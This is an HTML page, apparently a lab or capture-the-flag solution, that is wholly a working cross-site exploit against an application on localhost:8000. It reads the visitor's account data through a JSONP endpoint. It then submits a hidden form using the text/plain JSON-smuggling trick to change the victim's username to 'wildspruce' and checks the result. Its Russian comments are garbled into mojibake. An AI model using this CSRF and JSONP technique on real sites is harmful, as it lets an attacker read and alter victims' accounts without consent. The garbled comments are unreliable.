<!DOCTYPE html>
<html>
<head>
  <title>Redirect</title>
</head>
<body>
  <div id="log"></div>

  <script>
    function log(msg) {
      document.getElementById('log').innerHTML += '<p>' + msg + '</p>';
    }

    function exploit(data) {
      console.log("[EXPLOIT] User data BEFORE:", data);

      log('<h1 style="color:red;">EXPLOIT STARTED (GUEST MODE)</h1>');
      log('Username before: ' + data.username);
      log('Role: ' + data.role);

      // –®–∞–≥ 1: –ü–µ—Ä–µ—Ö–æ–¥ –Ω–∞ #/sheets
      window.location.hash = '#/sheets';
      log('‚úì Step 1: Navigated to #/sheets');

      // –°–æ–∑–¥–∞–µ–º iframe –∏ —Ñ–æ—Ä–º—É –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏
      const iframe = document.createElement('iframe');
      iframe.name = 'hiddenFrame';
      iframe.style.display = 'none';
      document.body.appendChild(iframe);

      // –í–∞—Ä–∏–∞–Ω—Ç 1: text/plain trick –¥–ª—è JSON
      const form = document.createElement('form');
      form.method = 'POST';
      form.action = 'http://localhost:8000/api/whoami';
      form.target = 'hiddenFrame';
      form.enctype = 'text/plain';

      const input = document.createElement('input');
      input.type = 'hidden';
      input.name = '{"new_username":"wild';
      input.value = 'spruce"}';
      form.appendChild(input);

      log('Trying text/plain JSON injection...');

      document.body.appendChild(form);

      setTimeout(() => {
        // –®–∞–≥ 2: –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–æ—Ä–º—É
        console.log("[EXPLOIT] Submitting form...");
        form.submit();
        log('‚úì Step 2: Form submitted');

        setTimeout(() => {
          // –®–∞–≥ 3: –ü—Ä–æ–≤–µ—Ä—è–µ–º —á–µ—Ä–µ–∑ JSONP, –∏–∑–º–µ–Ω–∏–ª—Å—è –ª–∏ username
          window.checkResult = function(updatedData) {
            console.log("[EXPLOIT] User data AFTER:", updatedData);
            log('<h2 style="color:green;">‚úì Username after: ' + updatedData.username + '</h2>');

            // –®–∞–≥ 4: –ü–µ—Ä–µ—Ö–æ–¥ –Ω–∞ #/settings
            window.location.hash = '#/settings';
            log('‚úì Step 3: Navigated to #/settings');

            if (updatedData.username === 'wildspruce') {
              log('<h2 style="color:green;">üéâ EXPLOIT COMPLETE! üéâ</h2>');
            } else {
              log('<h2 style="color:red;">EXPLOIT FAILED - username not changed</h2>');
            }
          };

          const script = document.createElement('script');
          script.src = 'http://localhost:8000/api/whoami/jsonp?callback=checkResult';
          document.body.appendChild(script);
        }, 1000);
      }, 500);
    }
  </script>

  <!-- JSONP –∑–∞–ø—Ä–æ—Å, –∫–æ—Ç–æ—Ä—ã–π –≤—ã–∑–æ–≤–µ—Ç —Ñ—É–Ω–∫—Ü–∏—é exploit -->
  <script src="http://localhost:8000/api/whoami/jsonp?callback=exploit"></script>
</body>
</html>
